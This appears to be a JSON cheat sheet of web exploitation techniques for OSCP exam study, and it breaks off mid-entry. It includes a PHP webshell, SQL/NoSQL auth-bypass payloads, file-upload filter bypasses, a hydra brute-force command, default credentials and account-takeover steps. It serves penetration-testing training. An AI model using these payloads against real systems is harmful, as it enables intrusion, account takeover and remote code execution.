{
  "category": "web",
  "subcategory": "manual-exploitation",
  "description": "Manual web application enumeration, testing, and exploitation techniques for OSCP",
  "commands": [
    {
      "id": "web-manual-enumeration",
      "name": "Manual Web Application Enumeration",
      "category": "web",
      "subcategory": "enumeration",
      "command": "Browse application, view source, check robots.txt, examine forms, test inputs, enumerate pages",
      "description": "Manually enumerate web application to identify technologies, attack surface, and potential vulnerabilities before automated tools",
      "tags": [
        "ENUMERATION",
        "MANUAL",
        "OSCP:HIGH",
        "RECONNAISSANCE",
        "WEB"
      ],
      "variables": [],
      "flag_explanations": {},
      "success_indicators": [
        "Technologies identified (PHP, Laravel, WordPress, etc.)",
        "Attack surface mapped (login, upload, search, admin panel)",
        "Interesting endpoints found (/admin, /backup, /api)",
        "Input validation weaknesses noted",
        "Version numbers discovered"
      ],
      "failure_indicators": [
        "Site completely static (no attack surface)",
        "All functionality behind authentication",
        "WAF blocking all requests"
      ],
      "next_steps": [
        "web-version-enumeration",
        "burpsuite-intercept-request",
        "sqli-manual-test"
      ],
      "alternatives": [
        "nikto -h <TARGET>",
        "gobuster dir -u http://<TARGET> -w wordlist.txt"
      ],
      "troubleshooting": {
        "nothing_interesting": "Check common paths: /admin, /login, /api, /uploads, /backup. View page source for comments. Check robots.txt, sitemap.xml",
        "cant_identify_tech": "Check HTTP headers: curl -I http://target. Look for X-Powered-By, Server headers. Check page source for framework indicators (Laravel = .blade.php, Django = csrftoken)",
        "need_systematic_approach": "Use checklist: 1) Browse all pages 2) View source 3) Test forms 4) Check robots.txt 5) Examine cookies 6) Test error messages 7) Map attack surface"
      },
      "notes": "CRITICAL OSCP METHODOLOGY: Manual enumeration BEFORE automated tools.\n\nManual web enumeration checklist:\n(1) Browse application\n    - Visit all pages\n    - Click all links\n    - Map functionality (login, search, upload, contact, admin)\n    - Note unusual features\n\n(2) View page source (Ctrl+U)\n    - HTML comments (<!-- TODO: Remove admin backdoor -->)\n    - JavaScript files (api endpoints, validation logic)\n    - Hidden form fields\n    - Hardcoded credentials\n    - Version numbers\n\n(3) Check standard files\n    - /robots.txt (disallowed paths are interesting)\n    - /sitemap.xml (all pages listed)\n    - /.git/ (exposed Git repository)\n    - /backup/, /backup.zip\n    - /README.md, /CHANGELOG.md\n\n(4) Technology identification\n    - Framework: Laravel (.blade.php), Django (csrftoken), WordPress (wp-content)\n    - Language: PHP (.php extension), ASP (.aspx), JSP (.jsp)\n    - Server: Apache (Server header), Nginx, IIS\n    - CMS: WordPress, Joomla, Drupal (view source for indicators)\n\n(5) Test all input fields\n    - Login forms: SQL injection ('admin'--), default creds\n    - Search: XSS (<script>alert(1)</script>), SQLi\n    - Upload: File upload bypass, webshell upload\n    - Contact forms: Command injection, email injection\n    - URL parameters: SQLi, LFI, XSS\n\n(6) Examine HTTP headers\n    curl -I http://target\n    - Server version (Apache/2.4.41)\n    - X-Powered-By (PHP/7.4.3)\n    - Set-Cookie (session management)\n    - X-Frame-Options, CSP (security headers)\n\n(7) Error message analysis\n    - Trigger errors intentionally\n    - SQL errors (database type, version)\n    - Path disclosure (/var/www/html/index.php)\n    - Stack traces (framework, libraries)\n\n(8) Session management\n    - Cookie inspection (F12 → Application → Cookies)\n    - Session token format (predictable? JWT?)\n    - Session fixation testing\n    - Logout functionality\n\n(9) Authentication testing\n    - Default credentials (admin:admin, admin:password)\n    - Password reset functionality\n    - Registration page (if available)\n    - Account lockout policy\n    - Brute force protection\n\n(10) Attack surface mapping\n    - List all forms and inputs\n    - List all parameters (GET, POST)\n    - List all cookies\n    - List all endpoints (/api/, /admin/, /user/)\n    - Identify high-value targets\n\nCommon OSCP findings from manual enumeration:\n(1) Version numbers in page source\n    → Search for CVEs, public exploits\n\n(2) Hidden admin panel in robots.txt\n    → Disallow: /admin\n    → Browse to /admin for login\n\n(3) SQL injection in login form\n    → Test with single quote\n    → Error reveals MySQL version\n\n(4) File upload without validation\n    → Upload PHP webshell\n    → RCE achieved\n\n(5) Path disclosure in error messages\n    → /var/www/html/ revealed\n    → Helps with LFI exploitation\n\nBrowser tools (F12 DevTools):\n- Elements: Inspect HTML, modify forms\n- Console: Execute JavaScript, API testing\n- Network: HTTP requests/responses, parameters\n- Application: Cookies, localStorage, sessionStorage\n- Sources: JavaScript source code, debugging\n\nManual testing workflow:\n1. Visit http://target (THIS STEP)\n2. Browse all pages, map functionality\n3. View source, check for comments/credentials\n4. Test one input manually (SQL injection with ')\n5. If vulnerable, proceed with SQLMap\n6. If not, continue manual testing other inputs\n\nKey observations to document:\n- Framework/technology (guides exploit selection)\n- Version numbers (CVE search)\n- Input fields (attack vectors)\n- Upload functionality (webshell upload)\n- Admin panel location (privilege escalation)\n- Error messages (information disclosure)\n\nOSCP exam tip: Spend 10-15 minutes on manual enumeration BEFORE running tools. Document everything in enumeration.md. Manual testing often reveals vulns that tools miss (logic flaws, weak passwords, exposed admin panels). Trust manual verification over automated tools.\n\nTime estimate: 10-20 minutes (thorough manual enumeration)",
      "oscp_relevance": "high"
    },
    {
      "id": "web-version-enumeration",
      "name": "Web Technology Version Enumeration",
      "category": "web",
      "subcategory": "enumeration",
      "command": "whatweb <TARGET> -v",
      "description": "Enumerate web application technologies, frameworks, and versions to identify CVEs and public exploits",
      "tags": [
        "CVE",
        "ENUMERATION",
        "OSCP:HIGH",
        "TECHNOLOGY_DETECTION",
        "VERSION_DETECTION",
        "WEB"
      ],
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target web application URL",
          "example": "http://10.10.11.18",
          "required": true
        }
      ],
      "flag_explanations": {
        "-v": "Verbose output - Shows all detected plugins, versions, and details. Without this, output is brief. Essential for comprehensive technology identification and version detection"
      },
      "success_indicators": [
        "Technologies detected (Apache, PHP, Laravel, etc.)",
        "Version numbers shown",
        "Framework identified",
        "Plugins/modules listed",
        "HTTP headers revealed"
      ],
      "failure_indicators": [
        "Connection refused",
        "No technologies detected (static HTML)",
        "Timeout"
      ],
      "next_steps": [
        "searchsploit <TECHNOLOGY> <VERSION>",
        "web-manual-enumeration"
      ],
      "alternatives": [
        "wappalyzer",
        "curl -I <TARGET>",
        "nmap -p 80,443 --script http-enum <TARGET>"
      ],
      "prerequisites": [
        "nmap-service-scan"
      ],
      "troubleshooting": {
        "no_version_info": "Check page source manually: view-source:http://target. Look for meta tags, JavaScript includes, CSS files with version numbers",
        "connection_issues": "Verify service running: nmap -p 80,443 <TARGET>. Check URL format (http:// vs https://)",
        "too_brief_output": "Add -v flag for verbose. Try --aggression 3 for deeper probing (may trigger WAF)"
      },
      "notes": "VERSION ENUMERATION → CVE SEARCH → PUBLIC EXPLOIT: Standard OSCP workflow.\n\nWhatWeb usage:\nwhatweb http://target              - Brief output\nwhatweb -v http://target           - Verbose (RECOMMENDED)\nwhatweb -a 3 http://target         - Aggressive mode (more plugins, louder)\nwhatweb http://target --log-json=output.json - JSON output for parsing\n\nCommon technologies detected:\nWeb Servers:\n- Apache/2.4.41 (Ubuntu)\n- nginx/1.18.0\n- Microsoft-IIS/10.0\n\nLanguages:\n- PHP/7.4.3\n- Python/3.8 (Django, Flask)\n- Ruby/2.7 (Rails)\n- ASP.NET\n\nFrameworks:\n- Laravel 8.x\n- WordPress 5.8.1\n- Drupal 9\n- Joomla 3.9\n\nOSCP exploitation workflow:\n1. Enumerate versions (THIS COMMAND)\n   whatweb -v http://target\n\n2. Extract key versions\n   Example output:\n   Apache/2.4.41, PHP/7.4.3, Laravel 8.75.0\n\n3. Search for CVEs\n   searchsploit laravel 8.75\n   searchsploit apache 2.4.41\n   searchsploit php 7.4\n\n4. Research vulnerabilities\n   Google: \"Laravel 8.75 CVE\"\n   ExploitDB: https://www.exploit-db.com/\n   GitHub: Search for \"Laravel 8.75 exploit\"\n\n5. Test exploit\n   Download PoC, modify for target, execute\n\n6. Document in vulnerability_research.md\n\nAlternative enumeration methods:\nMethod 1: curl headers\ncurl -I http://target\n→ Server: Apache/2.4.41\n→ X-Powered-By: PHP/7.4.3\n\nMethod 2: Wappalyzer (browser extension)\n→ Click icon in browser\n→ Shows technologies visually\n\nMethod 3: Manual page source inspection\nView source (Ctrl+U) and search for:\n- <meta name=\"generator\" content=\"WordPress 5.8\">\n- <script src=\"/js/jquery-3.5.1.min.js\"></script>\n- <!-- Laravel v8.75.0 -->\n\nMethod 4: Nmap HTTP enumeration\nnmap -p 80 --script http-enum,http-headers,http-title target\n\nMethod 5: Nikto\nnikto -h http://target\n→ Comprehensive but slow and loud\n\nCommon OSCP scenarios:\n(1) Laravel version with CVE\n    whatweb reveals: Laravel/8.40.0\n    → SearchSploit: Laravel 8.40.0 RCE (CVE-2021-3129)\n    → Download exploit, achieve RCE\n\n(2) WordPress with vulnerable plugin\n    whatweb reveals: WordPress 5.8.1\n    → wpscan --url http://target --enumerate vp\n    → Find plugin with known exploit\n\n(3) Apache with mod_cgi vulnerability\n    whatweb reveals: Apache/2.4.49\n    → Search: Shellshock, Path Traversal (CVE-2021-41773)\n    → Exploit for RCE\n\n(4) Outdated PHP version\n    whatweb reveals: PHP/5.6.40\n    → Multiple known vulnerabilities\n    → Exploit PHP-FPM/FastCGI issues\n\nVersion format interpretation:\nApache/2.4.41 (Ubuntu) OpenSSL/1.1.1g\n│      │       │         │\n│      │       │         └─ SSL library version\n│      │       └─ Operating system\n│      └─ Version number (Major.Minor.Patch)\n└─ Software name\n\nCritical versions to note:\n- Web server (Apache, Nginx, IIS)\n- Language runtime (PHP, Python, Ruby)\n- Framework (Laravel, Django, Rails, WordPress)\n- CMS (WordPress, Joomla, Drupal)\n- Libraries (jQuery, Bootstrap)\n\nSearching for exploits:\n# SearchSploit (local ExploitDB)\nsearchsploit <TECHNOLOGY> <VERSION>\nsearchsploit -m <EDB-ID>  # Download exploit\n\n# Google dorks\n\"<TECHNOLOGY> <VERSION>\" CVE\n\"<TECHNOLOGY> <VERSION>\" exploit\n\"<TECHNOLOGY> <VERSION>\" RCE\n\n# ExploitDB online\nhttps://www.exploit-db.com/search?q=<TECHNOLOGY>\n\n# GitHub\nsite:github.com \"<TECHNOLOGY> <VERSION>\" exploit\n\nOSCP exam tip: Run whatweb immediately after confirming web service. Focus on versions that are 2+ years old (likely vulnerable). Cross-reference with searchsploit. If no direct exploit, search for authentication bypass, RCE, file upload vulnerabilities for that technology.\n\nTime estimate: 30 seconds (whatweb) + 5-10 minutes (CVE research)",
      "oscp_relevance": "high"
    },
    {
      "id": "web-login-admin-panel",
      "name": "Web Admin Panel Login Attempt",
      "category": "web",
      "subcategory": "authentication",
      "command": "Navigate to /admin, /login, /administrator and test default credentials",
      "description": "Access web application admin panel using default credentials, found credentials, or password reuse for privilege escalation",
      "tags": [
        "AUTHENTICATION",
        "DEFAULT_CREDENTIALS",
        "OSCP:HIGH",
        "PRIVILEGE_ESCALATION",
        "WEB"
      ],
      "variables": [],
      "flag_explanations": {},
      "success_indicators": [
        "Admin panel accessible",
        "Login successful",
        "Administrative dashboard visible",
        "Elevated functionality available (upload, settings, users)"
      ],
      "failure_indicators": [
        "Invalid credentials",
        "404 Not Found (admin panel doesn't exist)",
        "403 Forbidden (IP restriction)",
        "Account locked after failed attempts"
      ],
      "next_steps": [
        "burpsuite-intercept-request",
        "web-access-uploaded-file",
        "create-php-webshell"
      ],
      "alternatives": [
        "hydra -l admin -P passwords.txt http-post-form",
        "wpscan --url http://target --passwords wordlist.txt"
      ],
      "prerequisites": [
        "web-manual-enumeration",
        "sqlmap-dump-table"
      ],
      "troubleshooting": {
        "cant_find_admin": "Common paths: /admin, /administrator, /admin.php, /login, /backend, /wp-admin (WordPress), /admin/login, /phpmyadmin. Use gobuster to find",
        "default_creds_fail": "Try credential combinations from SQLi dump. Test password reuse from other services. Check robots.txt for username hints",
        "account_lockout": "Too many failed attempts. Wait or use slower attack. Check if lockout bypassed by IP change or session reset",
        "credentials_not_working": "Verify correct panel (WordPress vs custom). Check for case sensitivity. Try variations (admin vs Admin, password vs Password1)"
      },
      "notes": "CRITICAL OSCP PRIVILEGE ESCALATION: Admin panel access = RCE via file upload.\n\nAdmin panel discovery methods:\n(1) Manual browsing\n    - http://target/admin\n    - http://target/administrator  \n    - http://target/login\n    - http://target/backend\n    - http://target/wp-admin (WordPress)\n    - http://target/phpmyadmin (Database)\n\n(2) robots.txt\n    Disallow: /admin\n    → Hidden admin panel location revealed\n\n(3) Gobuster/dirb\n    gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt\n    → Finds /admin, /login, /administrator\n\n(4) Page source comments\n    <!-- TODO: Secure /admin/backdoor.php -->\n\n(5) Error messages\n    → Redirect to /admin/login.php\n\nDefault credentials to test:\nadmin:admin\nadmin:password\nadmin:password123\nadmin:admin123\nadministrator:administrator\nroot:root\nroot:password\nroot:toor\ntest:test\nguest:guest\n\nFramework-specific defaults:\nWordPress: admin:password\nJoomla: admin:admin\nDrupal: admin:admin\nphpMyAdmin: root:(blank)\nTomcat: admin:admin, tomcat:tomcat\n\nOSCP credential reuse workflow:\n1. SQL injection → Dump users table\n   sqlmap -r request.txt --dump -T users\n\n2. Extract admin credentials\n   admin:$2y$10$... (bcrypt hash)\n\n3. Crack hash\n   john --format=bcrypt --wordlist=rockyou.txt hashes.txt\n   → admin:whatever1\n\n4. Test on admin panel (THIS COMMAND)\n   Navigate to /admin\n   Username: admin\n   Password: whatever1\n   → Login successful\n\n5. Upload webshell\n   → RCE achieved\n\nCommon OSCP scenarios:\n(1) Database credentials work on admin panel\n    From config.php: dbuser:dbpass123\n    Test: /admin login with dbuser:dbpass123\n    → Success (password reuse)\n\n(2) Default credentials still configured\n    Fresh WordPress install: admin:password\n    → Immediate admin access\n\n(3) Weak credentials\n    Brute force with common passwords\n    admin:admin123 works\n    → Admin panel compromised\n\n(4) Password reset exploitation\n    Reset form vulnerable to SQLi\n    → Bypass authentication\n    → Admin session obtained\n\nAdmin panel exploitation paths:\n(1) File upload\n    → Upload PHP webshell\n    → Browse to uploaded file\n    → RCE achieved\n\n(2) Plugin/theme installation (WordPress)\n    → Install malicious plugin with webshell\n    → Activate plugin\n    → RCE achieved\n\n(3) Template/theme editing\n    → Edit theme file (404.php, header.php)\n    → Add PHP webshell code\n    → Browse to modified theme file\n    → RCE achieved\n\n(4) Settings modification\n    → Change upload restrictions\n    → Enable dangerous features\n    → Exploit newly enabled functionality\n\n(5) User management\n    → Create new admin user\n    → Persistence established\n\nBurp Suite testing:\n1. Intercept login request\n2. Send to Intruder\n3. Set payload positions (username, password)\n4. Load wordlist\n5. Start attack\n6. Look for different response length/status\n\nManual credential testing:\n# Small list (manual)\nadmin:admin\nadmin:password\nadmin:admin123\n\n# Medium list (Burp)\nLoad top 100 passwords\nTest against admin user\n\n# Large list (Hydra)\nhydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form \"/admin/login.php:username=^USER^&password=^PASS^:F=Invalid\"\n\nSession hijacking (if SQLi available):\n1. Dump session table\n   SELECT * FROM sessions WHERE user_id = 1 (admin)\n\n2. Extract admin session token\n   session_token: abc123def456\n\n3. Set cookie in browser\n   Document.cookie = \"PHPSESSID=abc123def456\"\n\n4. Refresh page\n   → Logged in as admin\n\nAuthentication bypass techniques:\n(1) SQL injection\n    Username: admin'--\n    Password: anything\n    → Bypasses password check\n\n(2) NoSQL injection (MongoDB)\n    Username: admin\n    Password: {\"$ne\": \"\"}\n    → Not equal to empty = always true\n\n(3) Session fixation\n    Set session cookie before login\n    → Session reused after authentication\n\n(4) Password reset token prediction\n    Analyze reset token format\n    → Generate valid token\n    → Reset admin password\n\nOSCP exam tip: Check for admin panel in first 5 minutes of web enum. Test default credentials immediately. If SQL injection found, prioritize dumping user credentials for admin access. Admin panel + file upload = guaranteed RCE.\n\nTime estimate: 2-5 minutes (discovery) + 1-10 minutes (credential testing)",
      "oscp_relevance": "high"
    },
    {
      "id": "user-registration-test",
      "name": "Test User Registration Functionality",
      "category": "web",
      "subcategory": "authentication",
      "command": "Register new account and test for privilege escalation opportunities",
      "description": "Test user registration to create account and identify privilege escalation vectors (role manipulation, SQL injection, etc.)",
      "tags": [
        "AUTHENTICATION",
        "OSCP:MEDIUM",
        "PRIVILEGE_ESCALATION",
        "REGISTRATION",
        "WEB"
      ],
      "variables": [],
      "flag_explanations": {},
      "success_indicators": [
        "Account created successfully",
        "Login works with new account",
        "User dashboard accessible",
        "Functionality available for testing"
      ],
      "failure_indicators": [
        "Registration disabled",
        "Email verification required (can't receive)",
        "CAPTCHA blocking",
        "Account pending approval"
      ],
      "next_steps": [
        "burpsuite-intercept-request",
        "sqli-manual-test",
        "web-login-admin-panel"
      ],
      "alternatives": [
        "burpsuite-modify-upload"
      ],
      "prerequisites": [
        "web-manual-enumeration"
      ],
      "troubleshooting": {
        "email_verification": "Try temp email services: temp-mail.org, 10minutemail.com. Or bypass: Intercept registration request, modify email to existing admin. Or look for verification token pattern",
        "registration_disabled": "Check if endpoint still exists but hidden. Try direct POST to /register. Look for alternate registration paths (/api/register, /signup)",
        "captcha_blocking": "Intercept request, remove CAPTCHA parameter. Or try automated CAPTCHA solving. Or find development/testing endpoint without CAPTCHA"
      },
      "notes": "USER REGISTRATION → PRIVILEGE ESCALATION: Common OSCP vector.\n\nRegistration testing workflow:\n1. Find registration page\n   - /register, /signup, /create-account\n   - Look for \"Sign up\" link on login page\n\n2. Intercept registration request (Burp Suite)\n   - Capture POST to /register\n   - Examine parameters\n\n3. Test for vulnerabilities (THIS STEP)\n   a. Role/privilege manipulation\n   b. SQL injection in registration fields\n   c. Username enumeration\n   d. Email verification bypass\n\n4. Create account\n   - Use test credentials\n   - Document account details\n\n5. Test account functionality\n   - Login with new account\n   - Explore available features\n   - Look for elevation paths\n\nCommon registration vulnerabilities:\n(1) Role parameter manipulation\n    Normal request:\n    POST /register\n    username=test&password=test123&email=test@test.com\n\n    Modified request:\n    POST /register  \n    username=test&password=test123&email=test@test.com&role=admin\n    → Account created with admin privileges\n\n(2) SQL injection in registration\n    Username: admin'-- \n    → May overwrite existing admin account\n    → Or bypass validation\n\n(3) Email verification bypass\n    Register: user@test.com\n    Intercept verification link\n    Modify user_id parameter\n    → Verify different user's account\n\n(4) Username collision\n    Register: admin (lowercase)\n    → May conflict with Admin (uppercase)\n    → Gain Admin privileges\n\n(5) Mass assignment\n    Add parameters:\n    is_admin=1, is_verified=1, role=admin\n    → Framework auto-assigns to user object\n\n(6) NoSQL injection (MongoDB)\n    Username: {\"$ne\": null}\n    → Bypasses validation\n\n(7) Client-side validation bypass\n    Disable JavaScript\n    Submit invalid data\n    → Server doesn't re-validate\n\nBurp Suite registration testing:\n1. Browse to /register\n2. Fill form with test data\n3. Intercept request (Proxy → Intercept)\n4. Send to Repeater (Ctrl+R)\n5. Add parameters:\n   &role=admin\n   &is_admin=true\n   &user_type=administrator\n6. Forward request\n7. Check if account has elevated privileges\n\nOSCP HackTheBox Usage machine example:\nStandard registration:\nPOST /register\nusername=test&password=test123&email=test@test.com\n→ Regular user created\n\nModified registration (role injection):\nPOST /register\nusername=test&password=test123&email=test@test.com&role=1\n→ Admin user created (if role parameter not sanitized)\n\nTesting methodology:\nTest 1: Basic registration\n- Register normally\n- Verify account works\n- Document baseline\n\nTest 2: Role manipulation\n- Add &role=admin to request\n- Add &is_admin=1 to request\n- Add &user_type=administrator to request\n- Check if privileges elevated\n\nTest 3: SQL injection\n- Username: admin'--\n- Password: anything\n- Check if existing admin overwritten\n\nTest 4: Email enumeration\n- Register with existing email\n- Check error message\n- \"Email already registered\" = enumeration\n\nTest 5: Username enumeration  \n- Register with existing username\n- Check error message\n- \"Username taken\" = enumeration\n\nRegistration parameter fuzzing:\nCommon parameter names to test:\nrole, is_admin, admin, user_type, privilege, access_level, rank, status, is_verified, verified, active, approved, permissions\n\nFor each parameter, try values:\n1, true, admin, administrator, root, superuser\n\nPost-registration testing:\n1. Login with new account\n2. Check user profile/settings\n   - Can you modify role?\n   - Can you see other users?\n   - Can you access admin features?\n\n3. Test privilege escalation\n   - Browse to /admin\n   - Try admin functions\n   - Check if role persisted\n\n4. Session analysis\n   - Examine cookies\n   - Look for role in JWT\n   - Modify session data\n\nOSCP exam scenarios:\n(1) Registration with role parameter\n    → Create admin account\n    → Access admin panel\n    → Upload webshell\n    → RCE\n\n(2) SQL injection in username\n    → Overwrite admin account\n    → Login as admin with your password\n    → Admin access\n\n(3) Email verification bypass\n    → Create account\n    → Modify verification token\n    → Verify as admin\n    → Elevated privileges\n\nOSCP exam tip: If registration available, test immediately. Intercept with Burp, add privilege parameters (role, is_admin, user_type). Even if it doesn't work, you've created a test account for further testing. Common in web challenges.\n\nTime estimate: 5-10 minutes (registration testing) + 5 minutes (privilege verification)",
      "oscp_relevance": "medium"
    },
    {
      "id": "burpsuite-intercept-request",
      "name": "Burp Suite Intercept HTTP Request",
      "category": "web",
      "subcategory": "proxy",
      "command": "Proxy → Intercept → Capture request → Modify parameters → Forward",
      "description": "Intercept and modify HTTP requests using Burp Suite to test for parameter manipulation, SQL injection, and authentication bypass",
      "tags": [
        "BURP",
        "INTERCEPTION",
        "OSCP:HIGH",
        "PARAMETER_MANIPULATION",
        "PROXY",
        "WEB"
      ],
      "variables": [],
      "flag_explanations": {},
      "success_indicators": [
        "Request intercepted successfully",
        "Parameters visible and editable",
        "Modified request forwarded",
        "Response shows impact of modification"
      ],
      "failure_indicators": [
        "Browser not configured for proxy",
        "Request not intercepted (wrong scope)",
        "SSL/TLS errors (certificate not trusted)"
      ],
      "next_steps": [
        "burpsuite-modify-upload",
        "sqli-manual-test",
        "user-registration-test"
      ],
      "alternatives": [
        "curl -X POST -d 'param=value' http://target",
        "python requests library"
      ],
      "prerequisites": [
        "web-manual-enumeration"
      ],
      "troubleshooting": {
        "not_intercepting": "Check Intercept is ON (button shows 'Intercept is on'). Verify browser proxy settings (127.0.0.1:8080). Check Target Scope (may be filtering)",
        "ssl_errors": "Install Burp CA certificate. Browser: Visit http://burp, download certificate, install in browser settings",
        "cant_modify": "Request is in view mode. Click 'Intercept is on' to enable. Or send to Repeater (Ctrl+R) for easier modification"
      },
      "notes": "CRITICAL OSCP TOOL: Burp Suite for request manipulation and parameter testing.\n\nBurp Suite setup:\n1. Start Burp Suite\n   burpsuite &\n   → Select Temporary Project\n   → Use Burp defaults\n\n2. Configure browser proxy\n   Firefox:\n   Settings → Network Settings → Manual proxy\n   HTTP Proxy: 127.0.0.1\n   Port: 8080\n   ✓ Use this proxy for all protocols\n\n3. Install Burp CA certificate (for HTTPS)\n   Browse to: http://burp\n   Click \"CA Certificate\"\n   Firefox: Settings → Privacy & Security → Certificates → View Certificates → Import\n\n4. Enable interception\n   Proxy tab → Intercept sub-tab\n   Click \"Intercept is on\" (should be on)\n\nRequest interception workflow:\n1. Browse to target website\n2. Perform action (submit form, click link)\n3. Request intercepted in Burp\n4. Modify parameters (THIS STEP)\n5. Click \"Forward\" to send\n6. View response in browser\n\nCommon modifications:\n(1) Parameter injection\n    Original: username=test&password=test123\n    Modified: username=test&password=test123&role=admin\n    → Test for privilege escalation\n\n(2) SQL injection testing\n    Original: username=admin&password=pass\n    Modified: username=admin'--&password=anything\n    → Test for SQLi in login\n\n(3) File upload bypass\n    Original: Content-Type: image/png\n    Modified: Content-Type: image/png\n              filename=\"shell.php.png\"\n    → Bypass upload restrictions\n\n(4) Session token manipulation\n    Original: Cookie: session=abc123\n    Modified: Cookie: session=admin_session_token\n    → Session hijacking\n\n(5) Hidden field modification\n    Original: <input type=\"hidden\" name=\"price\" value=\"100\">\n    Modified: price=1\n    → Price manipulation\n\nBurp Suite tools:\nProxy:\n- Intercept: Capture and modify requests in real-time\n- HTTP history: View all requests/responses\n- WebSockets history: WS traffic\n\nRepeater:\n- Repeat requests with modifications\n- Easier than re-intercepting\n- Send with Ctrl+R from any request\n\nIntruder:\n- Automated parameter fuzzing\n- Brute force attacks\n- Wordlist-based testing\n\nDecoder:\n- URL encode/decode\n- Base64 encode/decode\n- HTML encode/decode\n\nComparer:\n- Compare two requests/responses\n- Identify differences\n\nCommon OSCP use cases:\n(1) Password reset token manipulation\n    Intercept reset request\n    POST /reset\n    email=victim@test.com&token=abc123\n    \n    Modify email:\n    email=attacker@test.com&token=abc123\n    → Reset attacker's password with victim's token\n\n(2) File upload type bypass  \n    Intercept upload request\n    Content-Type: application/x-php\n    \n    Change to allowed type:\n    Content-Type: image/png\n    → Upload PHP shell as PNG\n\n(3) Parameter pollution\n    Original: ?id=1\n    Modified: ?id=1&id=2&id=3\n    → May bypass validation\n\n(4) HTTP method manipulation\n    Original: POST /admin\n    Modified: GET /admin\n    → Bypass method-based access control\n\n(5) Authentication bypass\n    Original: username=test&password=wrong\n    Modified: username=admin'-- &password=anything\n    → SQL injection auth bypass\n\nSaving requests for later:\n1. Right-click request → \"Copy to file\"\n2. Save as reset.req\n3. Use with SQLMap:\n   sqlmap -r reset.req -p email\n\nOSCP workflow for password reset exploitation:\n1. Navigate to password reset\n2. Enter email, intercept request (THIS COMMAND)\n3. Modify email parameter\n   POST /reset  \n   email=victim@test.com → email=attacker@test.com\n4. Forward request\n5. Check if token sent to attacker email\n6. Use token to reset victim password\n\nBurp Suite keyboard shortcuts:\nCtrl+R: Send to Repeater\nCtrl+I: Send to Intruder\nCtrl+Space: Toggle intercept\nCtrl+Shift+B: Base64 encode\nCtrl+Shift+U: URL encode\n\nRepeater workflow (easier than intercepting):\n1. Intercept request once\n2. Send to Repeater (Ctrl+R)\n3. Modify in Repeater\n4. Click \"Send\"\n5. View response immediately\n6. Modify again, resend\n→ Much faster for testing multiple variations\n\nOSCP exam tip: Use Burp for ALL web testing. Intercept login, registration, upload, password reset requests. Look for hidden parameters, role fields, admin flags. Save important requests to files for SQLMap. Repeater is faster than re-intercepting.\n\nTime estimate: 30 seconds per request interception + variable modification time",
      "oscp_relevance": "high"
    },
    {
      "id": "burpsuite-modify-upload",
      "name": "Burp Suite Modify File Upload",
      "category": "web",
      "subcategory": "file-upload",
      "command": "Intercept upload request → Modify Content-Type → Modify filename → Forward",
      "description": "Bypass file upload restrictions using Burp Suite to upload webshell by modifying Content-Type headers and filenames",
      "tags": [
        "BURP",
        "FILE_UPLOAD",
        "FILTER_BYPASS",
        "OSCP:HIGH",
        "RCE",
        "WEB",
        "WEBSHELL"
      ],
      "variables": [],
      "flag_explanations": {},
      "success_indicators": [
        "File upload successful despite restrictions",
        "PHP file uploaded with image extension",
        "Webshell accessible via browser",
        "RCE achieved through uploaded file"
      ],
      "failure_indicators": [
        "Upload still rejected (server-side validation)",
        "File uploaded but not executable",
        "File uploaded to inaccessible location",
        "WAF blocking upload attempt"
      ],
      "next_steps": [
        "web-access-uploaded-file",
        "webshell-execute-revshell",
        "create-php-webshell"
      ],
      "alternatives": [
        "create-php-webshell"
      ],
      "prerequisites": [
        "burpsuite-intercept-request",
        "web-manual-enumeration"
      ],
      "troubleshooting": {
        "still_rejected": "Server-side validation checking actual file content (magic bytes). Need to craft polyglot file: Add PHP code to valid image file. Or try different extensions: .phtml, .php3, .php5, .phar",
        "uploaded_but_not_executable": "File uploaded to location without PHP execution. Find upload directory: check response, source code, gobuster. Try path traversal: ../../../var/www/html/shell.php",
        "cant_find_uploaded_file": "Check response for upload path. Intercept upload, check response. Brute force upload directory: gobuster dir -u http://target/uploads -w wordlist.txt"
      },
      "notes": "CRITICAL OSCP RCE VECTOR: File upload bypass → Webshell upload → RCE.\n\nFile upload bypass techniques:\n(1) Content-Type manipulation\n    Client-side validation (BYPASS)\n    Original request:\n    Content-Type: application/x-php\n    filename=\"shell.php\"\n    \n    Modified (THIS TECHNIQUE):\n    Content-Type: image/png\n    filename=\"shell.php\"\n    → Bypass MIME type check\n\n(2) Double extension\n    filename=\"shell.php.png\"\n    → Server processes as PHP if misconfigured\n\n(3) Null byte injection (older PHP)\n    filename=\"shell.php%00.png\"\n    → Truncates at null byte, saves as shell.php\n\n(4) Case sensitivity bypass\n    filename=\"shell.PhP\"\n    → Blacklist may only check .php (lowercase)\n\n(5) Alternate PHP extensions\n    .phtml, .php3, .php4, .php5, .phar, .phps\n    → May not be blacklisted\n\n(6) Path traversal\n    filename=\"../../../var/www/html/shell.php\"\n    → Upload to web-accessible location\n\n(7) Polyglot file (magic bytes + PHP)\n    PNG header + PHP code\n    → Passes magic byte validation\n    → Executes as PHP if accessed directly\n\nBurp Suite file upload bypass workflow:\n1. Prepare webshell\n   Create shell.php with PHP webshell code\n\n2. Attempt normal upload\n   Upload shell.php through web form\n   → Likely rejected\n\n3. Intercept upload request (THIS STEP)\n   Burp → Proxy → Intercept ON\n   Re-submit upload\n   → Request captured\n\n4. Analyze request\n   POST /upload HTTP/1.1\n   Content-Type: multipart/form-data; boundary=----123\n   \n   ------123\n   Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\n   Content-Type: application/x-php\n   \n   <?php system($_GET['cmd']); ?>\n   ------123--\n\n5. Modify for bypass\n   Change Content-Type: image/png\n   Or change filename: shell.php.png\n   Or both\n\n6. Forward request\n   → Upload successful\n\n7. Access uploaded file\n   http://target/uploads/shell.php.png?cmd=whoami\n   → RCE achieved\n\nCommon upload locations:\n/uploads/\n/upload/\n/files/\n/images/\n/media/\n/assets/\n/user_uploads/\n/public/uploads/\n/var/www/html/uploads/\n\nFinding upload directory:\nMethod 1: Check upload response\n→ {\"status\":\"success\",\"path\":\"/uploads/file.php\"}\n\nMethod 2: View page source\n→ <img src=\"/uploads/image.png\">\n\nMethod 3: Gobuster\ngobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt\n→ /uploads (Status: 200)\n\nMethod 4: Burp response\nUpload test file, check response headers\n→ Location: /uploads/test.txt\n\nOSCP HackTheBox Usage machine example:\n1. Admin panel has avatar upload\n2. Upload shell.php → Rejected (\"Only images allowed\")\n3. Intercept 